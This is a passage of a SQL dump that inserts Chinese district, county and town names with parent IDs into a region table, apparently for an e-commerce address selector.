INSERT INTO `ec22703249_region` VALUES ('1067', '137', '白马井镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1068', '137', '兰洋镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1069', '137', '和庆镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1070', '137', '海头镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1071', '137', '排浦镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1072', '137', '东成镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1073', '137', '光村镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1074', '137', '木棠镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1075', '137', '新州镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1076', '137', '三都镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1077', '137', '其他', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1078', '138', '长安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1079', '138', '桥东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1080', '138', '桥西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1081', '138', '新华区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1082', '138', '裕华区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1083', '138', '井陉矿区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1084', '138', '高新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1085', '138', '辛集市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1086', '138', '藁城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1087', '138', '晋州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1088', '138', '新乐市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1089', '138', '鹿泉市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1090', '138', '井陉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1091', '138', '正定县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1092', '138', '栾城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1093', '138', '行唐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1094', '138', '灵寿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1095', '138', '高邑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1096', '138', '深泽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1097', '138', '赞皇县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1098', '138', '无极县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1099', '138', '平山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1100', '138', '元氏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1101', '138', '赵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1102', '139', '新市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1103', '139', '南市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1104', '139', '北市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1105', '139', '涿州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1106', '139', '定州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1107', '139', '安国市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1108', '139', '高碑店市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1109', '139', '满城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1110', '139', '清苑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1111', '139', '涞水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1112', '139', '阜平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1113', '139', '徐水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1114', '139', '定兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1115', '139', '唐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1116', '139', '高阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1117', '139', '容城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1118', '139', '涞源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1119', '139', '望都县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1120', '139', '安新县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1121', '139', '易县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1122', '139', '曲阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1123', '139', '蠡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1124', '139', '顺平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1125', '139', '博野县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1126', '139', '雄县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1127', '140', '运河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1128', '140', '新华区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1129', '140', '泊头市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1130', '140', '任丘市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1131', '140', '黄骅市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1132', '140', '河间市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1133', '140', '沧县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1134', '140', '青县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1135', '140', '东光县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1136', '140', '海兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1137', '140', '盐山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1138', '140', '肃宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1139', '140', '南皮县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1140', '140', '吴桥县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1141', '140', '献县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1142', '140', '孟村', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1143', '141', '双桥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1144', '141', '双滦区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1145', '141', '鹰手营子矿区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1146', '141', '承德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1147', '141', '兴隆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1148', '141', '平泉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1149', '141', '滦平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1150', '141', '隆化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1151', '141', '丰宁', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1152', '141', '宽城', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1153', '141', '围场', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1154', '142', '从台区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1155', '142', '复兴区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1156', '142', '邯山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1157', '142', '峰峰矿区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1158', '142', '武安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1159', '142', '邯郸县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1160', '142', '临漳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1161', '142', '成安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1162', '142', '大名县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1163', '142', '涉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1164', '142', '磁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1165', '142', '肥乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1166', '142', '永年县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1167', '142', '邱县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1168', '142', '鸡泽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1169', '142', '广平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1170', '142', '馆陶县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1171', '142', '魏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1172', '142', '曲周县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1173', '143', '桃城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1174', '143', '冀州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1175', '143', '深州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1176', '143', '枣强县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1177', '143', '武邑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1178', '143', '武强县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1179', '143', '饶阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1180', '143', '安平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1181', '143', '故城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1182', '143', '景县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1183', '143', '阜城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1184', '144', '安次区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1185', '144', '广阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1186', '144', '霸州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1187', '144', '三河市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1188', '144', '固安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1189', '144', '永清县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1190', '144', '香河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1191', '144', '大城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1192', '144', '文安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1193', '144', '大厂', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1194', '145', '海港区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1195', '145', '山海关区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1196', '145', '北戴河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1197', '145', '昌黎县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1198', '145', '抚宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1199', '145', '卢龙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1200', '145', '青龙', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1201', '146', '路北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1202', '146', '路南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1203', '146', '古冶区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1204', '146', '开平区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1205', '146', '丰南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1206', '146', '丰润区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1207', '146', '遵化市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1208', '146', '迁安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1209', '146', '滦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1210', '146', '滦南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1211', '146', '乐亭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1212', '146', '迁西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1213', '146', '玉田县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1214', '146', '唐海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1215', '147', '桥东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1216', '147', '桥西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1217', '147', '南宫市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1218', '147', '沙河市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1219', '147', '邢台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1220', '147', '临城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1221', '147', '内丘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1222', '147', '柏乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1223', '147', '隆尧县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1224', '147', '任县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1225', '147', '南和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1226', '147', '宁晋县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1227', '147', '巨鹿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1228', '147', '新河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1229', '147', '广宗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1230', '147', '平乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1231', '147', '威县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1232', '147', '清河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1233', '147', '临西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1234', '148', '桥西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1235', '148', '桥东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1236', '148', '宣化区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1237', '148', '下花园区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1238', '148', '宣化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1239', '148', '张北县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1240', '148', '康保县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1241', '148', '沽源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1242', '148', '尚义县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1243', '148', '蔚县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1244', '148', '阳原县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1245', '148', '怀安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1246', '148', '万全县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1247', '148', '怀来县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1248', '148', '涿鹿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1249', '148', '赤城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1250', '148', '崇礼县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1251', '149', '金水区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1252', '149', '邙山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1253', '149', '二七区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1254', '149', '管城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1255', '149', '中原区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1256', '149', '上街区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1257', '149', '惠济区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1258', '149', '郑东新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1259', '149', '经济技术开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1260', '149', '高新开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1261', '149', '出口加工区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1262', '149', '巩义市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1263', '149', '荥阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1264', '149', '新密市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1265', '149', '新郑市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1266', '149', '登封市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1267', '149', '中牟县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1268', '150', '西工区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1269', '150', '老城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1270', '150', '涧西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1271', '150', '瀍河回族区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1272', '150', '洛龙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1273', '150', '吉利区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1274', '150', '偃师市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1275', '150', '孟津县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1276', '150', '新安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1277', '150', '栾川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1278', '150', '嵩县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1279', '150', '汝阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1280', '150', '宜阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1281', '150', '洛宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1282', '150', '伊川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1283', '151', '鼓楼区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1284', '151', '龙亭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1285', '151', '顺河回族区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1286', '151', '金明区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1287', '151', '禹王台区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1288', '151', '杞县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1289', '151', '通许县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1290', '151', '尉氏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1291', '151', '开封县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1292', '151', '兰考县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1293', '152', '北关区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1294', '152', '文峰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1295', '152', '殷都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1296', '152', '龙安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1297', '152', '林州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1298', '152', '安阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1299', '152', '汤阴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1300', '152', '滑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1301', '152', '内黄县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1302', '153', '淇滨区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1303', '153', '山城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1304', '153', '鹤山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1305', '153', '浚县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1306', '153', '淇县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1307', '154', '济源市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1308', '155', '解放区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1309', '155', '中站区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1310', '155', '马村区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1311', '155', '山阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1312', '155', '沁阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1313', '155', '孟州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1314', '155', '修武县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1315', '155', '博爱县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1316', '155', '武陟县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1317', '155', '温县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1318', '156', '卧龙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1319', '156', '宛城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1320', '156', '邓州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1321', '156', '南召县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1322', '156', '方城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1323', '156', '西峡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1324', '156', '镇平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1325', '156', '内乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1326', '156', '淅川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1327', '156', '社旗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1328', '156', '唐河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1329', '156', '新野县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1330', '156', '桐柏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1331', '157', '新华区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1332', '157', '卫东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1333', '157', '湛河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1334', '157', '石龙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1335', '157', '舞钢市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1336', '157', '汝州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1337', '157', '宝丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1338', '157', '叶县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1339', '157', '鲁山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1340', '157', '郏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1341', '158', '湖滨区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1342', '158', '义马市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1343', '158', '灵宝市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1344', '158', '渑池县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1345', '158', '陕县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1346', '158', '卢氏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1347', '159', '梁园区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1348', '159', '睢阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1349', '159', '永城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1350', '159', '民权县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1351', '159', '睢县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1352', '159', '宁陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1353', '159', '虞城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1354', '159', '柘城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1355', '159', '夏邑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1356', '160', '卫滨区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1357', '160', '红旗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1358', '160', '凤泉区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1359', '160', '牧野区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1360', '160', '卫辉市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1361', '160', '辉县市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1362', '160', '新乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1363', '160', '获嘉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1364', '160', '原阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1365', '160', '延津县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1366', '160', '封丘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1367', '160', '长垣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1368', '161', '浉河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1369', '161', '平桥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1370', '161', '罗山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1371', '161', '光山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1372', '161', '新县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1373', '161', '商城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1374', '161', '固始县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1375', '161', '潢川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1376', '161', '淮滨县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1377', '161', '息县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1378', '162', '魏都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1379', '162', '禹州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1380', '162', '长葛市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1381', '162', '许昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1382', '162', '鄢陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1383', '162', '襄城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1384', '163', '川汇区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1385', '163', '项城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1386', '163', '扶沟县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1387', '163', '西华县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1388', '163', '商水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1389', '163', '沈丘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1390', '163', '郸城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1391', '163', '淮阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1392', '163', '太康县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1393', '163', '鹿邑县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1394', '164', '驿城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1395', '164', '西平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1396', '164', '上蔡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1397', '164', '平舆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1398', '164', '正阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1399', '164', '确山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1400', '164', '泌阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1401', '164', '汝南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1402', '164', '遂平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1403', '164', '新蔡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1404', '165', '郾城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1405', '165', '源汇区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1406', '165', '召陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1407', '165', '舞阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1408', '165', '临颍县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1409', '166', '华龙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1410', '166', '清丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1411', '166', '南乐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1412', '166', '范县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1413', '166', '台前县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1414', '166', '濮阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1415', '167', '道里区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1416', '167', '南岗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1417', '167', '动力区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1418', '167', '平房区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1419', '167', '香坊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1420', '167', '太平区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1421', '167', '道外区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1422', '167', '阿城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1423', '167', '呼兰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1424', '167', '松北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1425', '167', '尚志市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1426', '167', '双城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1427', '167', '五常市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1428', '167', '方正县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1429', '167', '宾县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1430', '167', '依兰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1431', '167', '巴彦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1432', '167', '通河县', '3', '0');
